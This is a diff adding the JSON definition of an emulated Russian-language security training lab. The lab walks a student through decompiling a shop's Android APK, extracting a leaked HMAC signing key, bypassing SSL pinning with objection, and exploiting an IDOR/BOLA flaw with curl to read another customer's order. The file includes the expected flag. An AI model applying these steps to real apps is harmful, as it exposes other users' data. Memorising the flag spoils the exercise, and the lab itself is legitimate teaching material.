@@ -1,0 +1,51 @@
+{
+  "id": "web-mobile-api-bypass",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{m0b1l3_1d0r_b0l4_4p1_byp4ss}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: мобильное API — реверс APK и IDOR/BOLA\n\nУ магазина есть мобильное приложение `com.shop.app.apk` (это zip с кодом и\nресурсами). Найди в нём мобильный бэкенд и ключ подписи, затем проверь\nIDOR/BOLA на заказах.\n\n1. Распакуй и декомпилируй APK:\n\n   apktool d com.shop.app.apk -o app_src\n   jadx --deobf com.shop.app.apk -d app_java\n\n2. Ищем эндпоинты и секреты (strings + grep — grep тут литеральный):\n\n   strings com.shop.app.apk | grep mapi\n   strings com.shop.app.apk | grep sign_key\n\n3. Свой заказ по своему токену:\n\n   curl -s 'https://mapi.example/v2/orders/1001' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9'\n\n4. IDOR/BOLA — соседний ID возвращает чужой заказ (флаг):\n\n   curl -s 'https://mapi.example/v2/orders/1002' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9' > found.txt\n\n5. Подпись запросов (ключ уже утёк из APK):\n\n   openssl dgst -sha256 -hmac 's3cr3t-mobile-key'\n\n6. Набери `check`.\n" },
+    { "path": "/home/student/task/com.shop.app.apk", "text": "PK\u0003\u0004 (zip)\nhttps://mapi.example/v2/\nhttps://mapi.example/v2/orders\nhttps://mapi.example/v2/pay\nsign_key=s3cr3t-mobile-key\nX-Sign\nX-App-Version: 4.2.1\nX-Platform: android\n" }
+  ],
+  "tools": {
+    "apktool": {
+      "help": "apktool d <apk> -o <dir> — распаковка APK (эмуляция)",
+      "cases": [
+        { "match": "com\\.shop\\.app\\.apk", "example": "d com.shop.app.apk -o app_src", "output": "I: Using Apktool 2.9.3 on com.shop.app.apk\nI: Loading resource table...\nI: Decoding AndroidManifest.xml...\nI: Copying assets and libs...\n" }
+      ],
+      "fallback": "apktool: в этой лабе эмулируется только com.shop.app.apk.\n"
+    },
+    "jadx": {
+      "help": "jadx --deobf <apk> -d <dir> — декомпиляция в Java (эмуляция)",
+      "cases": [
+        { "match": "com\\.shop\\.app\\.apk|--deobf", "example": "--deobf com.shop.app.apk -d app_java", "output": "INFO  - loading ...\nINFO  - done\npublic class Api { static final String BASE = \"https://mapi.example/v2/\"; }\n" }
+      ],
+      "fallback": "jadx: в этой лабе эмулируется только com.shop.app.apk.\n"
+    },
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция mapi.example)",
+      "cases": [
+        { "match": "orders/1002", "example": "-s 'https://mapi.example/v2/orders/1002' -H 'Authorization: Bearer eyJ...'", "output": "{\"id\":1002,\"total\":9000,\"owner\":\"victim@corp.com\",\"note\":\"nto{m0b1l3_1d0r_b0l4_4p1_byp4ss}\"}\n" },
+        { "match": "orders/1001", "example": "-s 'https://mapi.example/v2/orders/1001' -H 'Authorization: Bearer eyJ...'", "output": "{\"id\":1001,\"total\":150,\"owner\":\"me@shop.local\"}\n" },
+        { "match": "/v2/pay", "example": "-s -X POST 'https://mapi.example/v2/pay' -H 'X-Sign: ...' -d '{\"amount\":1}'", "output": "{\"status\":\"ok\",\"charged\":1}\n" },
+        { "match": "mapi\\.example", "example": "-s 'https://mapi.example/v2/'", "output": "{\"service\":\"shop-mobile-api\",\"version\":\"v2\"}\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только мобильное API mapi.example.\n"
+    },
+    "openssl": {
+      "help": "openssl dgst -sha256 -hmac '<key>' — HMAC (эмуляция)",
+      "cases": [
+        { "match": "hmac|sha256", "example": "dgst -sha256 -hmac 's3cr3t-mobile-key'", "output": "(stdin)= 9f2a11c0e5b7d4a3c1f0e9d8b7a6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8\n" }
+      ],
+      "fallback": "openssl: в этой лабе эмулируется HMAC-SHA256.\n"
+    },
+    "objection": {
+      "help": "objection -g <pkg> explore — runtime-модификация (эмуляция)",
+      "cases": [
+        { "match": "com\\.shop\\.app|explore", "example": "-g com.shop.app explore", "output": "com.shop.app on (android: 13) [usb] # android sslpinning disable\n(agent) sslpinning disabled\n" }
+      ],
+      "fallback": "objection: в этой лабе эмулируется обход pinning для com.shop.app.\n"
+    }
+  }
+}
